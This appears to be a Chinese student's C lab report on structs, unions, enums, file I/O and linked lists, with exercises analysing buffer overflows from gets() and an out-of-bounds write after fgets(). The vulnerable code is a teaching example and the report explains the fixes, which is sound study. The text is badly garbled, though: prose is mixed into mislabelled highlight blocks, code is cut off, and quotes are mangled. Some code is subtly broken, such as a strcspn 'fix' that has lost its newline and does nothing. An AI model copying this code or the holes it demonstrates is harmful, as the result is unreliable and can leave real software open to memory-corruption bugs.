class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// 输出数据</span></span><br><span class="line">                <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Create the list first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">print</span>(head);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice. Try again.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="section-3">7-4</h2>
<p>打开C集成开发环境，建立一个sy7-4.cpp文件，输入以下代码，编译运行，并分析运行结果。理解结构体和联合体（共用体）的区别，理解枚举类型数据的定义和使用。</p>
<p>#include &lt;stdio.h&gt;</p>
<p>struct str_node</p>
<p>{</p>
<p>​ char ch[2];</p>
<p>​ short int k;</p>
<p>};</p>
<p>union uni_node</p>
<p>{</p>
<p>​ char ch[2];</p>
<p>​ short int k;</p>
<p>}b;</p>
<p>enum weekday{sun=7, mon=1, tue, wed, thr, fri, sat};</p>
<p>int main()</p>
<p>{</p>
<p>​ struct str_node a;</p>
<p>​ union uni_node b;</p>
<p>​ enum weekday c,d;</p>
<p>​ a.ch[0]=‘a’;</p>
<p>​ a.ch[1]=‘b’;</p>
<p>​ a.k=0x4241;</p>
<p>​ b.ch[0]=‘a’;</p>
<p>​ b.ch[1]=‘b’;</p>
<p>​ b.k=0x4241;</p>
<p>​ c=fri;</p>
<p>​ d=(enum weekday)6; //若删去(enum weekday)将会发生什么呢？</p>
<p>​ printf(“%c,%c”,a.ch[0],a.ch[1]);</p>
<p>​ printf(“%c,%c”,b.ch[0],b.ch[1]);</p>
<p>​ printf(“%d,%d”,c,d);</p>
<p>​ return 0;</p>
<p>}</p>
<p><strong>结构体 <code>str_node</code> 和联合体 <code>uni_node</code>
的定义</strong>：</p>
<ul>
<li><p>``` struct str_node <figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   是一个结构体，包含两个成员：</span><br><span class="line"></span><br><span class="line">  - `char ch[<span class="number">2</span>]`：字符数组，存储两个字符。</span><br><span class="line">  - `short int k`：一个短整型变量。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  union uni_node</span><br></pre></td></tr></table></figure></p>
<p>是一个联合体，包含两个成员：</p>
<ul>
<li><code>char ch[2]</code>：字符数组。</li>
<li><code>short int k</code>。</li>
</ul></li>
<li><p>区别</p>
<p>：</p>
<ul>
<li>结构体的所有成员占用独立的存储空间，<strong>总大小是所有成员大小之和</strong>。</li>
<li>联合体的所有成员共享同一块内存空间，<strong>总大小是最大成员的大小</strong>。</li>
</ul></li>
</ul>
<p><strong>枚举类型 <code>weekday</code> 的定义</strong>：</p>
<ul>
<li><p>``` enum weekday <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   定义了星期几的枚举类型：</span><br><span class="line"></span><br><span class="line"><span class="bullet">  -</span> <span class="code">`sun=7`</span> 明确指定值为7。</span><br><span class="line"><span class="bullet">  -</span> <span class="code">`mon`</span> 开始值为1，之后逐个递增：<span class="code">`tue=2, wed=3`</span>，依此类推。</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 用法</span><br><span class="line"></span><br><span class="line">  ：</span><br><span class="line"></span><br><span class="line"><span class="bullet">  -</span> <span class="code">`c = fri;`</span> 将 <span class="code">`c`</span> 赋值为枚举值 <span class="code">`fri`</span>，即 <span class="code">`fri=5`</span>。</span><br><span class="line"><span class="bullet">  -</span> <span class="code">`d = (enum weekday)6;`</span> 强制将整数 <span class="code">`6`</span> 转换为 <span class="code">`weekday`</span> 类型。</span><br><span class="line"></span><br><span class="line"><span class="strong">**代码逻辑解释**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="code">```</span></span><br><span class="line"><span class="code">  a.ch[0]=&#x27;a&#x27;; a.ch[1]=&#x27;b&#x27;; a.k=0x4241;</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>a.ch[0]</code> 和 <code>a.ch[1]</code> 分别存储字符
<code>'a'</code> 和 <code>'b'</code>。</li>
<li><code>a.k</code> 存储的是 <code>0x4241</code>，即 <code>'B'</code>
和 <code>'A'</code> 的 ASCII 码值（小端存储顺序）。</li>
</ul></li>
<li><p>``` b.ch[0]=‘a’; b.ch[1]=‘b’; b.k=0x4241; <figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 因为联合体 `b` 的所有成员共享存储空间，最后的赋值 `b.k=<span class="number">0</span>x4241` 会覆盖先前存储的字符 `&#x27;a&#x27;` 和 `&#x27;b&#x27;`。</span><br><span class="line"></span><br><span class="line">- 输出的值</span><br><span class="line"></span><br><span class="line">  ：</span><br><span class="line"></span><br><span class="line">  - `a.ch[<span class="number">0</span>]` 和 `a.ch[<span class="number">1</span>]` 输出为 `&#x27;a&#x27;` 和 `&#x27;b&#x27;`，因为结构体的成员独立存储。</span><br><span class="line">  - `b.ch[<span class="number">0</span>]` 和 `b.ch[<span class="number">1</span>]` 输出为 `&#x27;A&#x27;` 和 `&#x27;B&#x27;`，因为 `b.k=<span class="number">0</span>x4241` 覆盖了字符数组。</span><br><span class="line"></span><br><span class="line">- 枚举类型：</span><br><span class="line"></span><br><span class="line">  - `c = fri` 输出 `5`。</span><br><span class="line">  - `d = (enum weekday)<span class="number">6</span>` 强制转换，输出 `6`。</span><br><span class="line"></span><br><span class="line">**问题分析：若删除 `(enum weekday)` 会怎样？**</span><br><span class="line"></span><br><span class="line">- **问题**：`d = <span class="number">6</span><span class="comment">;` 会导致类型不匹配的编译错误。</span></span><br><span class="line">- 原因是 `d` 的类型是 `enum weekday`，只能赋值为 `weekday` 类型的值或强制类型转换后的值。</span><br><span class="line"></span><br><span class="line">## <span class="number">7</span>-<span class="number">5</span></span><br><span class="line"></span><br><span class="line">打开C集成开发环境，建立一个sy7-<span class="number">5</span>.cpp文件，输入以下代码，编译运行，试输入正常电话号码和非正常号码（如<span class="number">15</span>个<span class="number">1</span>）分析运行结果。程序存在什么安全隐患，为什么？应如何避免。</span><br><span class="line"></span><br><span class="line">\#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">struct bank</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​    char ID[<span class="number">10</span>]<span class="comment">;    //账号</span></span><br><span class="line"></span><br><span class="line">​    char name[<span class="number">20</span>]<span class="comment">;   //姓名  </span></span><br><span class="line"></span><br><span class="line">​    char mobile[<span class="number">12</span>]<span class="comment">;  //电话</span></span><br><span class="line"></span><br><span class="line">​    int balance<span class="comment">;    //币值</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​    struct bank x=&#123;<span class="string">&quot;123456789&quot;</span>,<span class="string">&quot;Bob&quot;</span>,<span class="string">&quot;13412345678&quot;</span>,<span class="number">1000</span>&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">​    printf(<span class="string">&quot;%s,%s,%d,%s\n&quot;</span>,x.ID,x.name,x.balance,x.mobile )<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">​    gets(x.mobile)<span class="comment">;  //重新输入电话号码</span></span><br><span class="line"></span><br><span class="line">​    printf(<span class="string">&quot;%s,%s,%d,%s\n&quot;</span>,x.ID,x.name,x.balance,x.mobile )<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#### **运行结果**</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. **正常输入电话号码**：</span><br><span class="line"></span><br><span class="line">   - 如果输入合法的<span class="number">11</span>位电话号码（如 `12345678901`），程序可以正常运行并输出修改后的电话号码。</span><br><span class="line"></span><br><span class="line">   - 输出示例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
复制代码123456789,Bob,1000,13412345678 123456789,Bob,1000,12345678901
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">2.</span> <span class="strong">**异常输入（例如输入15个字符或更多）**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 如果输入超出 <span class="code">`x.mobile`</span> 的长度限制（<span class="code">`12`</span> 字节，包括终止符），会导致内存溢出，可能破坏后续内存布局，甚至修改其他变量或引发程序崩溃。</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"><span class="section">#### <span class="strong">**存在的安全隐患**</span></span></span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> <span class="strong">**`gets` 函数的不安全性**</span>：</span><br><span class="line"><span class="bullet">   -</span> <span class="strong">**`gets` 不限制输入长度**</span>，用户可以输入任意多的字符，超过 <span class="code">`x.mobile`</span> 的大小时会导致<span class="strong">**缓冲区溢出**</span>。</span><br><span class="line"><span class="bullet">   -</span> 缓冲区溢出可能破坏其他内存区域，例如覆盖 <span class="code">`x.name`</span> 或 <span class="code">`x.balance`</span>，导致数据被篡改，甚至引发安全漏洞（如代码注入）。</span><br><span class="line"><span class="bullet">2.</span> <span class="strong">**输入长度未验证**</span>：</span><br><span class="line"><span class="bullet">   -</span> 用户输入未检查长度和格式，容易导致意外错误。</span><br><span class="line"><span class="bullet">   -</span> 输入超长字符串或非数字字符可能导致程序逻辑混乱。</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"><span class="section">#### <span class="strong">**如何避免安全隐患**</span></span></span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> <span class="strong">**避免使用 `gets`**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 替换为更安全的 <span class="code">`fgets`</span> 函数。</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 示例：</span><br><span class="line"></span><br></pre></td></tr></table></figure> c复制代码fgets(x.mobile, sizeof(x.mobile), stdin);
x.mobile[strcspn(x.mobile, “”)] = ‘\0’; // 去掉末尾的换行符
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">2.</span> <span class="strong">**限制输入长度**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 确保用户输入不会超过数组的大小，并进行输入长度验证。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> <span class="strong">**检查输入格式**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 验证电话号码是否为数字，且长度符合要求（如11位）。</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 示例：</span><br><span class="line"></span><br></pre></td></tr></table></figure> c复制代码if (strlen(x.mobile) != 11 || strspn(x.mobile,
“0123456789”) != 11) { printf(“Invalid phone number.”); return 1; }
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. **结构化输入处理**：</span><br><span class="line"></span><br><span class="line">   - 使用输入缓冲区，将数据解析并检查后再存入目标变量，避免直接操作目标数组。</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 实验8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 1</span></span><br><span class="line"></span><br><span class="line">打开C集成开发环境，建立一个sy8-1.cpp文件，编写一程序。要求：从键盘输入若干行字符，以“<span class="comment">#”结束，输入后把它们存储在磁盘文件“d:\data\sy8-1-out.txt”文件中。再从该文件中读取这些字符，将其中小写字母转换成大写字母后保存到磁盘文件“d:\data\sy8-1-out1.txt”文件中，同时把转换后的字符也显示在屏幕上。</span></span><br><span class="line"></span><br><span class="line">1. 首先在建立一个文本文件“d:\data\sy8-2-in.txt”文件内容如下（每个数间有一个空格）：</span><br><span class="line"></span><br><span class="line"> <span class="number"> 87 </span>80<span class="number"> 92 </span>78<span class="number"> 86 </span>95<span class="number"> 89 </span>82<span class="number"> 91 </span>83</span><br><span class="line"></span><br></pre></td></tr></table></figure> #include &lt;stdio.h&gt; #include
&lt;ctype.h&gt;</p></li>
</ul>
<p>int main() { FILE <em>fp_in, </em>fp_out; char input[1024]; char
ch;</p>
<pre><code>// 打开文件用于写入
fp_in = fopen(&quot;d:\\data\\sy8-1-out.txt&quot;, &quot;w&quot;);
if (fp_in == NULL) &#123;
    return 1;
&#125;

// 从键盘输入字符并存储到文件
while (fgets(input, sizeof(input), stdin)) &#123;
    if (input[0] == &#39;#&#39; &amp;&amp; input[1] == &#39;\n&#39;) &#123;
        break;
    &#125;
    fputs(input, fp_in);
&#125;
fclose(fp_in);

// 打开文件用于读取
fp_in = fopen(&quot;d:\\data\\sy8-1-out.txt&quot;, &quot;r&quot;);
if (fp_in == NULL) &#123;
    return 1;
&#125;

// 打开文件用于写入转换后的字符
fp_out = fopen(&quot;d:\\data\\sy8-1-out1.txt&quot;, &quot;w&quot;);
if (fp_out == NULL) &#123;
    fclose(fp_in);
    return 1;
&#125;

// 将小写字母转换为大写，并写入新文件，同时显示在屏幕上
while ((ch = fgetc(fp_in)) != EOF) &#123;
    if (islower(ch)) &#123;
        ch = toupper(ch);
    &#125;
    fputc(ch, fp_out);  // 写入新文件
    putchar(ch);        // 显示在屏幕
&#125;

// 关闭文件
fclose(fp_in);
fclose(fp_out);

return 0;</code></pre>
<p>} <figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">## 2</span></span><br><span class="line"></span><br><span class="line">打开<span class="type">C</span>集成开发环境，建立一个sy8-<span class="number">2</span>.cpp文件，编写一程序。要求：读取“d:\<span class="class"><span class="keyword">data</span>\sy8-2-in.txt”文件中的10个成绩，去掉最高分和最低分后计算出平均分。最后把剩下的8个成绩升序和平均分保存到磁盘文件“d:\<span class="keyword">data</span>\sy8-2-out.txt”，并在屏幕显示剩下的8个成绩升序平均分。格式如下：（每个成绩间有一个空格隔开，平均分放在第二行，平均分小数保留2位）86 87 89 91 92 </span></span><br><span class="line"></span><br><span class="line">​    <span class="number">86.25</span></span><br><span class="line"></span><br></pre></td></tr></table></figure> #include &lt;stdio.h&gt; #include
&lt;stdlib.h&gt;</p>
<p>#define NUM_SCORES 10</p>
<p>// 冒泡排序函数 void bubble_sort(int arr[], int n) { for (int i = 0;
i &lt; n - 1; i++) { for (int j = 0; j &lt; n - i - 1; j++) { if (arr[j]
&gt; arr[j + 1]) { int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] =
temp; } } } }</p>
<p>int main() { FILE <em>fp_in, </em>fp_out; int scores[NUM_SCORES]; int
sum = 0; float avg;</p>
<pre><code>fp_in = fopen(&quot;d:\\data\\sy8-2-in.txt&quot;, &quot;r&quot;);
if (fp_in == NULL) return 1;
for (int i = 0; i &lt; NUM_SCORES; i++) fscanf(fp_in, &quot;%d&quot;, &amp;scores[i]);
fclose(fp_in);

bubble_sort(scores, NUM_SCORES);

for (int i = 1; i &lt; NUM_SCORES - 1; i++) sum += scores[i];
avg = sum / 8.0;

fp_out = fopen(&quot;d:\\data\\sy8-2-out.txt&quot;, &quot;w&quot;);
if (fp_out == NULL) return 1;

for (int i = 1; i &lt; NUM_SCORES - 1; i++) &#123;
    fprintf(fp_out, &quot;%d &quot;, scores[i]);
    printf(&quot;%d &quot;, scores[i]);
&#125;
fprintf(fp_out, &quot;\n%.2f\n&quot;, avg);
printf(&quot;\n%.2f\n&quot;, avg);

fclose(fp_out);
return 0;</code></pre>
<p>} <figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">## 3</span></span><br><span class="line"></span><br><span class="line">打开C集成开发环境，建立一个sy8<span class="number">-3.</span>cpp文件，编写一程序处理学生数据，学生信息包括学号（字符型，不超过<span class="number">10</span>个数字）、姓名（不超过<span class="number">10</span>个字符）、<span class="number">3</span>门课成绩（<span class="built_in">float</span>型）和平均成绩（<span class="built_in">float</span>型）。要求：定义<span class="number">6</span>个函数，分别用于从键盘输入若干学生数据并计算出平均成绩的<span class="function"><span class="keyword">void</span> <span class="title">input_data</span>(<span class="params"><span class="keyword">struct</span> student stu[ ],<span class="built_in">int</span> n</span>)函数、按平均成绩升序排序的<span class="keyword">void</span> <span class="title">sort</span>(<span class="params"><span class="keyword">struct</span> student stu[ ],<span class="built_in">int</span> n</span>)的函数、按指定文件名以二进制方式保存学生数据的<span class="keyword">void</span> <span class="title">save</span>(<span class="params"><span class="keyword">struct</span> student stu[],<span class="built_in">int</span> n,<span class="built_in">char</span> filename[]</span>)函数、用于从指定文件中以二进制方式读取学生数据并返回记录数n的<span class="built_in">int</span> <span class="title">read</span>(<span class="params"><span class="keyword">struct</span> student stu[], <span class="built_in">char</span> filename[]</span>)函数、以及插入指定学生数据后仍保持平均分升序并返回人数的<span class="built_in">int</span> <span class="title">insert</span>(<span class="params"><span class="keyword">struct</span> student stu[],<span class="built_in">int</span> n,<span class="keyword">struct</span> student x</span>)函数和输出数据<span class="keyword">void</span> <span class="title">print_data</span>(<span class="params"><span class="keyword">struct</span> student stu[ ],<span class="built_in">int</span> n</span>)；最后在main函数中输入学生人数n，依次调用<span class="title">input_data</span>(<span class="params">stu,n</span>)、<span class="title">sort</span>(<span class="params">stu,n</span>)、<span class="title">save</span>(<span class="params">stu,n,”d:\data\sy8<span class="number">-3</span>-<span class="keyword">in</span>.txt”</span>)、<span class="title">print_data</span>(<span class="params">stu,n</span>)；再输入一个学生数据x，接着依次调用<span class="title">insert</span>(<span class="params">stu,n,x</span>)、<span class="title">save</span>(<span class="params">stu,n,”d:\data\sy8<span class="number">-3</span>-<span class="keyword">out</span>.txt”</span>)、n</span>=read(stu,”d:\data\sy8<span class="number">-3</span>-<span class="keyword">out</span>.txt”)和print_data(stu,n)函数。</span><br><span class="line"></span><br></pre></td></tr></table></figure> #include &lt;stdio.h&gt; #include
&lt;string.h&gt;</p>
<p>#define MAX_STUDENTS 100</p>
<p>// 学生数据结构 struct student { char id[11]; // 学号 char name[11];
// 姓名 float scores[3]; // 3门课程成绩 float avg; // 平均成绩 };</p>
<p>// 从键盘输入学生数据并计算平均成绩 void input_data(struct student
stu[], int n) { for (int i = 0; i &lt; n; i++) { scanf(“%s%s”,
stu[i].id, stu[i].name); float total = 0; for (int j = 0; j &lt; 3; j++)
{ scanf(“%f”, &amp;stu[i].scores[j]); total += stu[i].scores[j]; }
stu[i].avg = total / 3.0; } }</p>
<p>// 按平均成绩升序排序 void sort(struct student stu[], int n) { for
(int i = 0; i &lt; n - 1; i++) { for (int j = 0; j &lt; n - i - 1; j++)
{ if (stu[j].avg &gt; stu[j + 1].avg) { struct student temp = stu[j];
stu[j] = stu[j + 1]; stu[j + 1] = temp; } } } }</p>
<p>// 保存学生数据到指定文件 void save(struct student stu[], int n, char
filename[]) { FILE *fp = fopen(filename, “wb”); if (fp != NULL) {
fwrite(stu, sizeof(struct student), n, fp); fclose(fp); } }</p>
<p>// 从指定文件中读取学生数据并返回人数 int read(struct student stu[],
char filename[]) { FILE *fp = fopen(filename, “rb”); if (fp != NULL) {
int n = fread(stu, sizeof(struct student), MAX_STUDENTS, fp);
fclose(fp); return n; } return 0; }</p>
<p>// 插入学生数据并保持平均成绩升序 int insert(struct student stu[],
int n, struct student x) { int i = n - 1; while (i &gt;= 0 &amp;&amp;
stu[i].avg &gt; x.avg) { stu[i + 1] = stu[i]; i–; } stu[i + 1] = x;
return n + 1; }</p>
<p>// 输出学生数据 void print_data(struct student stu[], int n) { for
(int i = 0; i &lt; n; i++) { printf(“%s %s %.2f %.2f %.2f %.2f”,
stu[i].id, stu[i].name, stu[i].scores[0], stu[i].scores[1],
stu[i].scores[2], stu[i].avg); } }</p>
<p>// 主函数 int main() { struct student stu[MAX_STUDENTS], x; int
n;</p>
<pre><code>// 输入学生人数和数据
scanf(&quot;%d&quot;, &amp;n);
input_data(stu, n);
sort(stu, n);
save(stu, n, &quot;d:\\data\\sy8-3-in.txt&quot;);
print_data(stu, n);

// 输入新学生数据并插入
scanf(&quot;%s%s&quot;, x.id, x.name);
float total = 0;
for (int i = 0; i &lt; 3; i++) &#123;
    scanf(&quot;%f&quot;, &amp;x.scores[i]);
    total += x.scores[i];
&#125;
x.avg = total / 3.0;

n = insert(stu, n, x);
save(stu, n, &quot;d:\\data\\sy8-3-out.txt&quot;);

n = read(stu, &quot;d:\\data\\sy8-3-out.txt&quot;);
print_data(stu, n);

return 0;</code></pre>
<p>} <figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">## 4 </span></span><br><span class="line"></span><br><span class="line">打开C集成开发环境，建立一个sy8<span class="number">-4.</span>cpp文件，编写一程序。要求：使用链表操作学生信息（<span class="keyword">struct</span> student结构体包括学号（字符型，不超过<span class="number">10</span>个数字）、姓名（不超过<span class="number">10</span>个字符）、<span class="number">3</span>门课成绩（<span class="built_in">float</span>型）和平均成绩（<span class="built_in">float</span>型）），先定义<span class="number">2</span>个函数，分别用于从二进制文件读取学生数据创建链表（头插法）的<span class="keyword">struct</span> node*create(<span class="built_in">char</span> filename[])函数和输出链表中学生数据的<span class="function"><span class="keyword">void</span> <span class="title">print</span>(<span class="params"><span class="keyword">struct</span> node *h</span>)函数，最后在main函数中以“d:\data\sy8-3-<span class="keyword">out</span>.txt”文件名作为参数调用<span class="title">create</span>()创建链表和调用<span class="title">print</span>()函数输出学生数据。</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure> #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;
#include &lt;string.h&gt;</p>
<p>// 定义学生信息结构体 struct student { char id[11]; // 学号 char
name[11]; // 姓名 float scores[3]; // 3门课程成绩 float avg; // 平均成绩
};</p>
<p>// 定义链表节点结构体 struct node { struct student data; struct node
*next; };</p>
<p>// 从二进制文件读取学生数据并创建链表（头插法） struct node*
create(char filename[]) { FILE *fp = fopen(filename, “rb”); if (!fp) {
perror(“File open failed”); return NULL; }</p>
<pre><code>struct node *head = NULL; // 初始化头指针
struct student temp;

while (fread(&amp;temp, sizeof(struct student), 1, fp)) &#123;
    // 创建新节点
    struct node *new_node = (struct node *)malloc(sizeof(struct node));
    if (!new_node) &#123;
        perror(&quot;Memory allocation failed&quot;);
        fclose(fp);
        return NULL;
    &#125;
    new_node-&gt;data = temp;
    new_node-&gt;next = head; // 头插法插入链表
    head = new_node;
&#125;

fclose(fp);
return head;</code></pre>
<p>}</p>
<p>// 输出链表中学生数据 void print(struct node <em>h) { struct node
</em>p = h; while (p) { struct student *stu = &amp;p-&gt;data;
printf(“%s %s %.2f %.2f %.2f %.2f”, stu-&gt;id, stu-&gt;name,
stu-&gt;scores[0], stu-&gt;scores[1], stu-&gt;scores[2], stu-&gt;avg); p
= p-&gt;next; } }</p>
<p>// 主函数 int main() { struct node *head =
create(“d:\data\sy8-3-out.txt”); if (head) { print(head); } return 0; }
<figure class="highlight stan"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 5</span></span><br><span class="line"></span><br><span class="line">试分析以下程序段可能发生的安全隐患，应如何避免。程序试图从输入行中删去最后的换行符（\n）。fgets()函数通常用于从流中读取以换行符结束的输入行。它以目标缓冲区的大小（<span class="built_in">size</span>）作为参数，至多从流中复制<span class="built_in">size</span>-<span class="number">1</span>个字符到字符数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure> #include &lt;stdio.h&gt;</p>
<p>#include &lt;string.h&gt;</p>
<p>enum {BUFFER_SIZE=1024};</p>
<p>void fun()</p>
<p>{</p>
<p>​ char buf[BUFFER_SIZE];</p>
<p>​ if(fgets(buf,sizeof(buf),stdin)==NULL)</p>
<p>​ printf(“Read error!”);</p>
<p>​ buf[strlen(buf)-1]=‘\0’;</p>
<p>} <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">### 安全增强措施：</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> <span class="strong">**检查输入是否为空**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 在 <span class="code">`fgets()`</span> 成功返回后，计算字符串长度，确保其非空。</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> <span class="strong">**验证换行符的存在**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 使用条件 <span class="code">`buf[len - 1] == &#x27;\n&#x27;`</span> 判断最后一个字符是否为换行符。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> <span class="strong">**避免未定义行为**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 在输入为空时（<span class="code">`strlen(buf) == 0`</span>），避免对 <span class="code">`buf[-1]`</span> 进行访问。</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> <span class="strong">**处理超长输入**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 如果输入行的长度超出 <span class="code">`BUFFER_SIZE - 1`</span>，换行符可能被截断，可以根据需求进一步处理超长输入行。</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> <span class="strong">**错误处理**</span>：</span><br><span class="line"></span><br><span class="line"><span class="bullet">   -</span> 在 <span class="code">`fgets()`</span> 返回 <span class="code">`NULL`</span> 时，立即返回并避免后续对未初始化缓冲区的操作。</span><br><span class="line"></span><br></pre></td></tr></table></figure> #include &lt;stdio.h&gt; #include
&lt;string.h&gt;</p>
<p>enum {BUFFER_SIZE = 1024};</p>
<p>void fun() { char buf[BUFFER_SIZE];</p>
<pre><code>   if (fgets(buf, sizeof(buf), stdin) == NULL) &#123;
       printf(&quot;Read error or EOF!\n&quot;);
       return;  // 防止后续操作未初始化的 buf
   &#125;

   size_t len = strlen(buf);

   // 如果输入不为空且最后一个字符是换行符，则移除它
   if (len &gt; 0 &amp;&amp; buf[len - 1] == &#39;\n&#39;) &#123;
       buf[len - 1] = &#39;\0&#39;;
   &#125;

   printf(&quot;Processed input: %s\n&quot;, buf);</code></pre>
<p>}实验七，八漏洞分析 ```</p>
<h1 id="实验七八漏洞分析">实验七八漏洞分析</h1>
<h2 id="七">七</h2>
<p>答：gets(),strcpy,scanf(“%s”,x)等均是不安全函数
因币值balance的内存空间紧跟电话mobile后，若输入超长电话号码将覆盖币值数据。
建议把gets(x.mobile);改为gets_s(x.mobile,11)。
对于字符串输入建议使用scanf_s和gets_s函数；
strcpy()建议使用strncpy()或strcpy_s()</p>
<p>具体：<strong>运行结果分析</strong></p>
<ol type="1">
<li>输入正常电话号码（如
<code>13812345678</code>）：程序能够正常运行，输出更新后的电话号码，其他数据不受影响。</li>
<li>输入超长电话号码（如
<code>15个1</code>）：会导致<strong>缓冲区溢出</strong>，覆盖内存中的其他数据，可能导致程序崩溃、数据异常，甚至引发安全漏洞。</li>
</ol>
<hr />
<h3 id="程序存在的安全隐患"><strong>程序存在的安全隐患</strong></h3>
<ol type="1">
<li><p><strong><code>gets</code> 的使用问题</strong>:</p>
<ul>
<li><strong><code>gets</code> 不安全</strong>：<code>gets</code>
不会限制输入的长度，如果输入超出缓冲区大小，就会发生缓冲区溢出。</li>
<li>在这段代码中，<code>x.mobile</code> 的大小为 12 字节，而
<code>gets(x.mobile)</code> 没有限制输入长度。如果用户输入超过 12
个字符，就会覆盖结构体的其他成员变量甚至引发未定义行为。</li>
</ul></li>
<li><p><strong>缓冲区溢出</strong>:</p>
<ul>
<li>当用户输入超长字符串时，会覆盖内存中的其他数据，例如
<code>x.balance</code> 或 <code>x.name</code> 的值可能被破坏。</li>
<li>严重时，还可能覆盖返回地址，造成代码执行的偏移或被攻击者利用（例如注入恶意代码）。</li>
</ul></li>
<li><p><strong>潜在的安全威胁</strong>:</p>
<ul>
<li>缓冲区溢出漏洞可以被恶意利用，导致程序崩溃或攻击者获取系统控制权。</li>
<li>这是许多历史著名攻击（如 Morris 蠕虫、Blaster 蠕虫等）的基础。</li>
</ul>
<h2 id="八">八</h2>
<p>答：strlen()函数通过确定NULL结束符之前的字符数确定字符串长度。
如果fgets()从输入中读取的第一个字符恰好是个NULL字符，则出现错误。
例如，如果fgets调用读取的是一个二进制数据文件，就可能发生这种情况。
如果buf中的第一个字符是NULL字符，strlen(buf)返回0、表达式strlen(buf)-1回绕为一个大的正数，发生写入数组范围之外的错误。
解决方案使用strchr()代替字符串中的换行符（如果存在）</p>
<p>具体：<strong>1. 潜在的安全隐患</strong></p>
<ol type="1">
<li><strong>数组越界问题</strong>:
<ul>
<li>如果输入为空（例如用户直接按 <code>Enter</code> 或输入文件末尾
EOF），则 <code>fgets</code> 会将 <code>buf</code> 填充为一个空字符串
<code>""</code>。</li>
<li>此时 <code>strlen(buf)</code> 的结果是 <code>0</code>，代码中的
<code>buf[strlen(buf) - 1] = '\0'</code>
会导致数组越界访问（<code>buf[-1]</code>），引发未定义行为。</li>
</ul></li>
<li><strong>未检查换行符是否存在</strong>:
<ul>
<li>如果输入的行过长（超过
<code>BUFFER_SIZE-1</code>），<code>fgets</code>
会读取部分数据并截断，且输入中可能不包含换行符。此时，<code>buf[strlen(buf) - 1]</code>
的操作可能错误地删除一个有效字符。</li>
</ul></li>
<li><strong>未处理 <code>fgets</code> 返回 NULL 的情况</strong>:
<ul>
<li>如果 <code>fgets</code> 返回
